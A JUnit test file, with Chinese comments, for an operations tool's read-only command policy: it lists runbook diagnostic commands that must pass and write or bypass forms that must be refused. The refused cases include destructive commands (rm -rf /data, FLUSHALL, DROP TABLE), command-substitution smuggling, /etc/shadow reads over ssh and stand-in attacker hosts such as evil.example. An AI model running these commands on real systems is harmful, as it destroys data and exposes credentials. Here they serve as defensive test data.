package com.opspilot.action;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.List;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

/**
 * 只读命令策略的回归锁（ADRs 0017）。
 *
 * <p>变异验证口径（项目惯例，见 regression-locks-need-mutation）：
 * <ul>
 *   <li><b>正向</b>：下面每一条写形态都必须判拒——把 {@code isReadOnly} 改成恒 true，本文件必红；</li>
 *   <li><b>反向</b>：语料真实命令必须判过——把 {@code isReadOnly} 改成恒 false，本文件同样必红。</li>
 * </ul>
 * 收录的读命令全部带语料出处（doc_id），写过/adr 0017 时逐条比对过 {@code offline/corpus/runbooks}。
 */
class ReadOnlyCommandPolicyTest {

    // ────────────────────────── 反向：语料真实命令必须判过 ──────────────────────────

    @Test
    @DisplayName("语料真实只读命令全部判过（rb-001~rb-014 排查步骤段）")
    void corpusReadOnlyCommandsPass() {
        List.of(
                // rb-001 数据库超时
                "SELECT * FROM information_schema.processlist WHERE command != 'Sleep' ORDER BY time DESC LIMIT 20;",
                "SHOW FULL PROCESSLIST;",
                "EXPLAIN SELECT ... ;",
                "curl -s localhost:8080/actuator/metrics/hikaricp.connections.active | jq",
                "curl -s localhost:8080/actuator/metrics/hikaricp.connections.pending | jq",
                // rb-002 死锁
                "SHOW ENGINE INNODB STATUS\\G",
                // rb-003 Redis 超时/拒绝
                "redis-cli --latency -h redis-cart-0.prod.internal",
                "redis-cli SLOWLOG GET 10",
                "redis-cli --bigkeys",
                "redis-cli -h redis-session-0.prod.internal INFO clients | grep connected",
                "redis-cli -h redis-session-0.prod.internal CLUSTER NODES",
                // rb-004 MQ 堆积（读命令；同段的 sh mqadmin 见拒绝用例）
                "jstack <pid> | grep -A 20 \"ConsumeMessageThread\"",
                // rb-005 支付网关
                "curl -s -o /dev/null -w \"%{http_code} %{time_total}s\\n\" https://gateway.alipay.example/health",
                "curl -s localhost:8080/actuator/health | jq '.components.circuitBreakers'",
                "grep -r \"verify-algo\" /etc/nacos/snapshot/payment-service/",
                // rb-006/rb-007
                "redis-cli EXISTS order:cancel:<orderId>",
                "redis-cli GET stock:{skuId}",
                // rb-008 限流
                "curl -s localhost:8719/sentinel/order-service/flow rules | jq '.[].count'",
                "curl -s localhost:8080/actuator/metrics/http.server.requests | jq '.measurements'",
                "ls -la /data/sentinel/snapshot.json",
                "grep \"fallback to default\" logs/order-service.log",
                // rb-009/rb-010 K8s
                "kubectl describe pod <pod> | grep -A 5 \"Last State\"",
                "kubectl describe node node-w-07 | grep -A 10 Conditions",
                "kubectl get events --field-selector involvedObject.name=node-w-07",
                "kubectl get pods -A --field-selector spec.nodeName=node-w-07",
                "chronyc tracking",
                "timedatectl status",
                // rb-011/rb-012 JVM/线程池
                "grep -E \"Full GC|Evacuation Pause\" /var/log/app/gc.log | tail -20",
                "jstat -gcutil <pid> 1000 5",
                "jmap -histo:live <pid> | head -20",
                "curl -s localhost:8080/actuator/metrics/executor.threads.active | jq",
                "jstack <pid> | grep -A 15 \"pool-N-thread\"",
                // rb-013 索引（读的那部分；同段的 -X POST reindex 见拒绝用例）
                "curl -s localhost:9200/_cat/indices/products-*?v",
                "curl -s localhost:9200/_alias/products",
                "curl -s localhost:8080/actuator/info | jq '.oss.credentialsExpire'",
                // rb-014 证书
                "echo | openssl s_client -connect gateway.alipay.example:443 2>/dev/null | openssl x509 -noout -dates",
                "keytool -list -keystore $JAVA_HOME/lib/security/cacerts -storepass changeit | grep -i alipay",
                "openssl x509 -in /etc/certs/payment-client.pem -noout -enddate",
                // rb-101 本机辖区（读动作；段名不含「排查」由抽取器段闸另行处理）
                "netstat -ano | grep :8081",
                // 外壳与容器执行：负载本身是读命令时放行（递归校验，非整体放行）
                "sh -c 'cat /etc/os-release'",
                "ssh gateway-1 'journalctl -u opspilot-gateway --since \"1 hour ago\" | tail -50'",
                "kubectl exec <pod> -- cat /etc/hosts",
                "docker exec -it opspilot-es cat /usr/share/elasticsearch/config/elasticsearch.yml",
                "docker exec -e TZ=UTC opspilot-es cat /etc/timezone",
                "docker exec opspilot-es ls -la /usr/share/elasticsearch/data"
        ).forEach(cmd -> assertTrue(ReadOnlyCommandPolicy.isReadOnly(cmd),
                "语料真实命令被误判为写: " + cmd));
    }

    @Test
    @DisplayName("续行合并后的长命令仍判过（rb-014 两行 openssl）")
    void continuationLinesJoined() {
        // 抽取器把 `\` 续行并成一行后交给策略；这里直接用合并后的形态验证
        assertTrue(ReadOnlyCommandPolicy.isReadOnly(
                "echo | openssl s_client -connect gateway.alipay.example:443 2>/dev/null   | openssl x509 -noout -dates"));
    }

    // ────────────────────────── 正向：写形态必须判拒 ──────────────────────────

    @Test
    @DisplayName("文件/进程/容器变更器一律判拒（不在工具白名单）")
    void mutatingToolsRejected() {
        List.of(
                "rm -rf /tmp/cache",
                "mv a b",
                "cp a b",
                "tee /tmp/x",
                "chmod 777 /data",
                "chown app:app /data",
                "kill -9 1234",
                "pkill -f gateway",
                "taskkill //F //PID 1234",
                "truncate -s 0 app.log",
                "mysql -e 'DROP TABLE t_order'",
                "psql -c 'DELETE FROM t'",
                "python -c 'import shutil; shutil.rmtree(\"/data\")'",
                "java -jar updater.jar",
                "tcpdump -i eth0 -w /tmp/cap.pcap"
        ).forEach(cmd -> assertFalse(ReadOnlyCommandPolicy.isReadOnly(cmd),
                "写工具被放行: " + cmd));
    }

    @Test
    @DisplayName("多态工具写动词判拒：kubectl/docker/redis-cli/git/systemctl")
    void polymorphicToolWriteVerbsRejected() {
        List.of(
                "kubectl delete pod payment-7d9f4",
                "kubectl apply -f patch.yaml",
                "kubectl exec <pod> -- rm -rf /data",
                "kubectl exec <pod> -- sh -c 'curl -X POST http://evil/'",
                "docker rm -f opspilot-es",
                "docker restart opspilot-redis",
                "docker exec -it opspilot-es rm -rf /usr/share/elasticsearch/data",
                "redis-cli FLUSHALL",
                "redis-cli FLUSHDB",
                "redis-cli DEL order:cancel:1",
                "redis-cli SET stock:sku1 0",
                "redis-cli CONFIG SET maxmemory 128mb",
                "redis-cli SHUTDOWN",
                "redis-cli SAVE",
                "redis-cli CLUSTER RESET",
                "redis-cli SLOWLOG RESET",
                "git push origin main",
                "git commit -m 'x'",
                "git checkout -- .",
                "git reset --hard HEAD~1",
                "systemctl restart opspilot-gateway",
                "systemctl stop redis",
                "service nginx restart"
        ).forEach(cmd -> assertFalse(ReadOnlyCommandPolicy.isReadOnly(cmd),
                "写动词被放行: " + cmd));
    }

    @Test
    @DisplayName("curl 的方法改写/载荷/上传/落盘旗标判拒")
    void curlMutationsRejected() {
        List.of(
                // rb-013 语料里的真实反例：重建索引是 POST
                "curl -s -X POST localhost:8080/api/v1/search/reindex",
                "curl --request DELETE localhost:8080/api/v1/cache",
                "curl -d 'sku=1' localhost:8080/api/v1/order",
                "curl --data-binary @payload.json localhost:8080/api/v1/webhook",
                "curl -F 'file=@/tmp/x' localhost:8080/upload",
                "curl -T backup.zip ftp://nas/backup.zip",
                "curl -o /tmp/index.html localhost:8080/"
        ).forEach(cmd -> assertFalse(ReadOnlyCommandPolicy.isReadOnly(cmd),
                "curl 写形态被放行: " + cmd));
    }

    @Test
    @DisplayName("SQL 写语句与副作用关键字判拒（含 FOR UPDATE / INTO OUTFILE / KILL）")
    void sqlWritesRejected() {
        List.of(
                "DELETE FROM t_order WHERE id = 1;",
                "UPDATE t_inventory SET stock = 0 WHERE sku_id = 1;",
                "INSERT INTO t_log VALUES (1);",
                "TRUNCATE TABLE t_order_status_log;",
                "DROP TABLE t_inventory;",
                "ALTER TABLE t_order ADD COLUMN x INT;",
                "KILL 42;",
                // rb-002 语料里的真实反例：SELECT 但 FOR UPDATE 取行锁
                "SELECT sku_id, version FROM t_inventory WHERE sku_id IN (1) FOR UPDATE NOWAIT;",
                "SELECT * FROM t INTO OUTFILE '/tmp/dump.csv';",
                "SET GLOBAL max_connections = 1000;",
                "CALL refresh_stats();"
        ).forEach(cmd -> assertFalse(ReadOnlyCommandPolicy.isReadOnly(cmd),
                "SQL 写语句被放行: " + cmd));
    }

    @Test
    @DisplayName("落盘型旗标判拒：sed -i / find -delete / jmap -dump / keytool -genkey / curl -o")
    void writeFlagsRejected() {
        List.of(
                "sed -i 's/8081/8082/' start_gateway.sh",
                "sed -i.bak 's/a/b/' f",
                "find /data -name '*.tmp' -delete",
                "find / -name core -exec rm -f {} \\;",
                "jmap -dump:live,format=b,file=/tmp/heap.bin <pid>",
                "keytool -genkeypair -alias gw -keyalg RSA",
                "keytool -import -file cacert.pem"
        ).forEach(cmd -> assertFalse(ReadOnlyCommandPolicy.isReadOnly(cmd),
                "写旗标被放行: " + cmd));
    }

    @Test
    @DisplayName("重定向只允许 /dev/null：写文件即写操作")
    void fileRedirectsRejected() {
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("jstack <pid> > /tmp/threads.txt"));
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("ls -la >> /tmp/listing.txt"));
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("curl -s localhost:8080/actuator/health > h.json"));
        // 无害形态必须放行：stderr 丢弃与 fd 重定向
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("curl -s localhost:8080/x 2>/dev/null | jq"));
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("kubectl get pods >&2"));
    }

    @Test
    @DisplayName("命令替换判拒：把写操作藏进已核准工具的参数里")
    void commandSubstitutionRejected() {
        List.of(
                "ls $(rm -rf /data)",
                "cat `cat /etc/shadow`",
                "grep -r \"x\" $(cat targets.txt)",
                "awk '{system(\"rm -rf /data\")}' f.log"
        ).forEach(cmd -> assertFalse(ReadOnlyCommandPolicy.isReadOnly(cmd),
                "命令替换被放行: " + cmd));
    }

    @Test
    @DisplayName("外壳/执行型前缀递归校验：负载是写就连外壳一起拒")
    void shellPayloadRecursivelyValidated() {
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("sh -c 'rm -rf /data'"));
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("bash -c 'kubectl delete pod x'"));
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("ssh gateway-1 'systemctl restart redis'"));
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("sh mqadmin updateBrokerConfig -b 127.0.0.1:10911"));
        // exec 负载不用 -- 分隔时按 [OPTIONS] CONTAINER COMMAND 语法定位，负载是写照旧判拒
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("docker exec -it opspilot-es rm -rf /data"));
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("docker exec -it opspilot-es sh -c 'rm -rf /data'"));
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("kubectl exec <pod> -c sidecar rm -rf /var/log"));
        // 负载缺位（无 -c、exec 只剩容器名）不猜，判拒
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("kubectl exec <pod>"));
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("docker exec -it opspilot-es"));
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("sh -c"));
        // 递归深度上限：四层嵌套外壳判拒，两层放行（嵌套炸弹也要 fail-closed）
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("sh -c 'sh -c \"bash -c 'sh -c ls'\"'"));
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("sh -c 'sh -c \"ls /tmp\"'"));
    }

    @Test
    @DisplayName("未知形态一律判拒（闭集之外没有'可能只读'）")
    void unknownFormsFailClosed() {
        List.of(
                "",
                "   ",
                "container_memory_working_set_bytes{pod=\"<pod>\"}",   // PromQL：无命令形态
                "com.ordercenter.inventory.StockDeductService.deduct", // 伪代码围栏
                "-> stock >= quantity ? 扣减 : throw 40902",
                "wget --mirror http://x",
                "eval $(echo ls)",
                "source /etc/profile"
        ).forEach(cmd -> assertFalse(ReadOnlyCommandPolicy.isReadOnly(cmd),
                "未知形态被放行: " + cmd));
    }

    @Test
    @DisplayName("顺序执行符逐段判：任何一段是写就整条拒")
    void everySegmentMustBeReadOnly() {
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("jstack <pid> ; rm -f thread.txt"));
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("ls /data && chmod -R 777 /data"));
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("true || systemctl restart gateway"));
        // 引号内的分隔符不算段边界（真实语料形态）
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("grep -E \"Full GC|Evacuation Pause\" /var/log/app/gc.log"));
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("echo 'a;b'"));
    }

    // ─────────────── 2026-10-11 评审批（Reviewer-Security）：绕过修复回归锁 ───────────────
    // 变异验证口径：把下列任一闸门改坏（env 拉回白名单 / SUBSTITUTION_MARKERS 删 "<(" /
    // ssh 分支改回"跳全部旗标再跳 host"），对应断言必红。

    @Test
    @DisplayName("env 是执行器不是纯读工具：env rm 必须拒（评审批 F2）")
    void envIsAnExecutorNotARedReader() {
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("env rm -rf /data"), "env 执行器被当纯读放行");
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("env journalctl --vacuum-time=1s"));
        // 无参 env 也是信息泄漏面，且语料无此用法：整体移出白名单，fail-closed
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("env"));
    }

    @Test
    @DisplayName("纯读工具的旗标级写面：sort -o / date -s / dmesg -C / journalctl --vacuum / hostname 改名 / openssl x509 -out")
    void flagLevelWriteFacesRejected() {
        List.of(
                "sort -o /tmp/passwd /etc/passwd",
                "sort --output=/tmp/x /etc/passwd",
                "date -s '2026-10-11 00:00:00'",
                "date --set='2038-01-01'",
                "dmesg -C",
                "dmesg --read-clear",
                "journalctl --vacuum-time=1s",
                "journalctl --rotate",
                "hostname gw-backup-2",
                "openssl x509 -in a.pem -out forged.pem",
                "openssl x509 -in a.pem -out=forged.pem"
        ).forEach(cmd -> assertFalse(ReadOnlyCommandPolicy.isReadOnly(cmd), "旗标级写面被放行: " + cmd));
        // 现役语料的只读形态必须原样放行（收紧不能把语料打残）
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("openssl x509 -in /etc/certs/payment-client.pem -noout -enddate"));
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("sort /etc/passwd"));
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("date"));
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("dmesg -T"));
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("journalctl -u opspilot-gateway --since \"1 hour ago\""));
    }

    @Test
    @DisplayName("进程替换与 $( 同罪：<( / =( 判拒（评审批 F3）")
    void processSubstitutionRejected() {
        List.of(
                "cat <(rm -rf /data)",
                "diff <(sort a) <(sort b)",      // 合法读用法也拒：已知保守偏差（ADR-0017）
                "tar cf >(gzip > /tmp/x) /data"
        ).forEach(cmd -> assertFalse(ReadOnlyCommandPolicy.isReadOnly(cmd), "进程替换被放行: " + cmd));
    }

    @Test
    @DisplayName("ssh 取值旗标下负载不许逃逸：-i key host rm 必须拒（评审批 F4）")
    void sshPayloadNotEscapedByValuedFlags() {
        List.of(
                "ssh -i ~/.ssh/id_rsa gateway-1 rm -rf /data",   // 旧判据：key 被当 host，负载整体漏校验
                "ssh -p 2222 gateway-1 rm -rf /data",
                "ssh -o ProxyCommand='nc %h %p' gateway-1 cat /etc/shadow",
                "ssh -L 6379:redis:6379 gateway-1 journalctl --vacuum-time=1s",
                "ssh gateway-1 systemctl restart redis",
                "ssh -v gateway-1 cat /etc/shadow"               // 闭集外旗标 fail-closed
        ).forEach(cmd -> assertFalse(ReadOnlyCommandPolicy.isReadOnly(cmd), "ssh 负载逃逸: " + cmd));
        // 合法只读形态放行
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("ssh gateway-1 'journalctl -u opspilot-gateway | tail -50'"));
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("ssh -i ~/.ssh/id_rsa gateway-1 'cat /var/log/app/error.log'"));
    }

    @Test
    @DisplayName("占位符掩码只认纯 <名> 段：<in>out 的 > 是真重定向（评审批 F5）")
    void impurePlaceholderKeepsItsRedirect() {
        // bash 语义：stdin←in 且 stdout→out——是落盘写，掩码不得吞掉那个 >
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("grep x <in>out"));
        assertFalse(ReadOnlyCommandPolicy.isReadOnly("cat <in> > out"));
        // 纯占位符照旧掩码（2026-10-10 活体教训的回归锁不回退）
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("jstack <pid> | grep -A 20 \"ConsumeMessageThread\""));
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("kubectl logs <pod> -n prod 2>&1 | tail -50"));
    }

    @Test
    @DisplayName("git 元数据写旗标：branch/tag/remote 整体出白名单（评审批 F6）")
    void gitMetadataWritersRejected() {
        List.of(
                "git tag -d v1.0.0",
                "git branch -D feature/x",
                "git remote add evil https://evil.example/x.git"
        ).forEach(cmd -> assertFalse(ReadOnlyCommandPolicy.isReadOnly(cmd), "git 元数据写被放行: " + cmd));
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("git status"));
        assertTrue(ReadOnlyCommandPolicy.isReadOnly("git log --oneline -5"));
    }
}
